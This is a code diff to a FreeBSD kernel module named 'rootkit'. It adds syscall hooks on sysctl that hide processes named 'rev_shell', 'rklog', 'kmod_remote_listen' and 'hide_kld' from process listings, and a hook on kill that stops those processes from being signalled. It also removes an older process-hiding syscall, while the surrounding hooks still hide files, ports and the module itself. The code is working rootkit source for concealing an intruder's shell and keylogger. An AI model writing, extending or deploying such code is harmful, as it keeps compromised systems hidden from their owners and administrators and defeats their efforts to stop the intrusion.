@@ -12,6 +12,7 @@
 #include <sys/ucred.h>
 #include <sys/lock.h>
 #include <sys/mutex.h>
+#include <sys/user.h>
 #include <sys/condvar.h>
 #include <netinet/in.h>
 
@@ -249,6 +250,8 @@ static sy_call_t *orig_fstatat = NULL;
 static sy_call_t *orig_openat = NULL;
 static sy_call_t *orig_open = NULL;
 static sy_call_t *orig_access = NULL;
+static sy_call_t *orig_sysctl = NULL;
+static sy_call_t *orig_kill = NULL;
 
 static const char *blocked_files[] = {
     "/etc/rc.local",
@@ -263,6 +266,13 @@ static const char *blocked_files[] = {
     NULL
 };
 
+static const char *blocked_processes[] = {
+    "kmod_remote_listen",
+    "rev_shell",
+    "rklog",
+    "hide_kld",
+    NULL
+};
 
 static int
 is_blocked_path(const char *user_path)
@@ -286,6 +296,39 @@ is_blocked_path(const char *user_path)
 	}
 
 	return (0);
+}
+
+static int is_blocked_process_name(const char *proc_name)
+{
+    int i;
+
+    if (proc_name == NULL)
+        return (0);
+
+    for (i = 0; blocked_processes[i] != NULL; i++) {
+        if (strcmp(proc_name, blocked_processes[i]) == 0)
+            return (1);
+    }
+
+    return (0);
+}
+
+static int is_blocked_process_pid(pid_t pid)
+{
+    struct proc *p;
+    int blocked = 0;
+
+    if (pid <= 0)
+        return (0);
+
+    p = pfind(pid);
+    if (p != NULL) {
+        if (p->p_state == PRS_NORMAL)
+            blocked = is_blocked_process_name(p->p_comm);
+        PROC_UNLOCK(p);
+    }
+
+    return (blocked);
 }
 
 static int
@@ -329,6 +372,69 @@ static int access_hook(struct thread *td, void *syscall_args)
 		return (ENOENT);
 
 	return (orig_access(td, syscall_args));
+}
+
+static int
+sysctl_hook(struct thread *td, void *syscall_args)
+{
+    struct __sysctl_args *uap = (struct __sysctl_args *)syscall_args;
+    int error;
+
+    error = orig_sysctl(td, syscall_args);
+    if (error != 0 || uap->old == NULL || uap->oldlenp == NULL || uap->namelen < 3) {
+        return (error);
+    }
+
+    int name[3];
+    if (copyin(uap->name, name, sizeof(name)) != 0) {
+        return (error);
+    }
+
+    if (name[0] == CTL_KERN && name[1] == KERN_PROC) {
+        size_t oldlen = 0;
+        if (copyin(uap->oldlenp, &oldlen, sizeof(oldlen)) != 0) {
+            return (error);
+        }
+
+        if (oldlen < sizeof(struct kinfo_proc) || oldlen > (64 * 1024 * 1024)) {
+            return (error);
+        }
+
+        struct kinfo_proc *procs = malloc(oldlen, M_TEMP, M_WAITOK);
+        if (copyin(uap->old, procs, oldlen) == 0) {
+            size_t count = oldlen / sizeof(struct kinfo_proc);
+            size_t write_idx = 0;
+
+            for (size_t read_idx = 0; read_idx < count; read_idx++) {
+                if (!is_blocked_process_name(procs[read_idx].ki_comm)) {
+                    if (write_idx != read_idx) {
+                        procs[write_idx] = procs[read_idx];
+                    }
+                    write_idx++;
+                }
+            }
+
+            if (write_idx < count) {
+                size_t newlen = write_idx * sizeof(struct kinfo_proc);
+                if (copyout(procs, uap->old, newlen) == 0) {
+                    copyout(&newlen, uap->oldlenp, sizeof(newlen));
+                }
+            }
+        }
+        free(procs, M_TEMP);
+    }
+
+    return (error);
+}
+
+static int kill_hook(struct thread *td, void *syscall_args)
+{
+    struct kill_args *uap = (struct kill_args *)syscall_args;
+
+    if (is_blocked_process_pid(uap->pid))
+        return (ESRCH);
+
+    return (orig_kill(td, syscall_args));
 }
 
 struct port_hiding_args {
@@ -449,45 +555,6 @@ static struct sysent proc_hiding_sysent = {
 };
 static int proc_hiding_offset = NO_SYSCALL;
 
-struct process_hiding_args {
-    char *name;
-};
-
-static int process_hiding(struct thread *td, void *syscall_args) {
-    struct proc *p;
-    struct process_hiding_args *uap;
-    uap = (struct process_hiding_args *) syscall_args;
-
-	sx_xlock(&allproc_lock);
-
-	FOREACH_PROC_IN_SYSTEM(p) {
-		PROC_LOCK(p);
-
-		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
-			PROC_UNLOCK(p);
-			continue;
-		}
-
-		if (strstr(p->p_comm, uap->name)) {
-			LIST_REMOVE(p, p_list);
-			LIST_REMOVE(p, p_hash);
-		}
-
-		PROC_UNLOCK(p);
-	}
-
-	sx_xunlock(&allproc_lock);
-	return 0;
-}
-
-static struct sysent process_hiding_sysent = {
-    .sy_narg   = 1,
-    .sy_call   = (sy_call_t *)process_hiding,
-    .sy_auevent = AUE_NULL
-};
-
-static int process_hiding_offset = NO_SYSCALL;
-
 static int load(module_t module, int cmd, void *arg) {
     (void)module;
     (void)arg;
@@ -522,6 +589,12 @@ static int load(module_t module, int cmd, void *arg) {
 
 		orig_access = sysent[SYS_access].sy_call;
 		sysent[SYS_access].sy_call = (sy_call_t *)access_hook;
+
+        orig_sysctl = sysent[SYS___sysctl].sy_call;
+        sysent[SYS___sysctl].sy_call = (sy_call_t *)sysctl_hook;
+
+        orig_kill = sysent[SYS_kill].sy_call;
+        sysent[SYS_kill].sy_call = (sy_call_t *)kill_hook;
 
         if (error == 0) {
             struct proc *p = NULL;
@@ -558,14 +631,30 @@ static int load(module_t module, int cmd, void *arg) {
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
         sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-        if (orig_fstatat != NULL)
+
+        if (orig_fstatat != NULL) {
 			sysent[SYS_fstatat].sy_call = orig_fstatat;
-		if (orig_openat != NULL)
+        }
+
+		if (orig_openat != NULL) {
 			sysent[SYS_openat].sy_call = orig_openat;
-		if (orig_open != NULL)
+		}
+
+		if (orig_open != NULL) {
 			sysent[SYS_open].sy_call = orig_open;
-		if (orig_access != NULL)
+		}
+
+		if (orig_access != NULL) {
 			sysent[SYS_access].sy_call = orig_access;
+		}
+
+        if (orig_sysctl != NULL) {
+            sysent[SYS___sysctl].sy_call = orig_sysctl;
+        }
+
+        if (orig_kill != NULL) {
+            sysent[SYS_kill].sy_call = orig_kill;
+        }
         printf("rootkit: module unloaded\n");
         break;
 
@@ -590,4 +679,3 @@ DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
 SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, NULL, NULL);
 SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, NULL, NULL);
 SYSCALL_MODULE(proc_hiding, &proc_hiding_offset, &proc_hiding_sysent, NULL, NULL);
-SYSCALL_MODULE(process_hiding, &process_hiding_offset, &process_hiding_sysent, NULL, NULL);
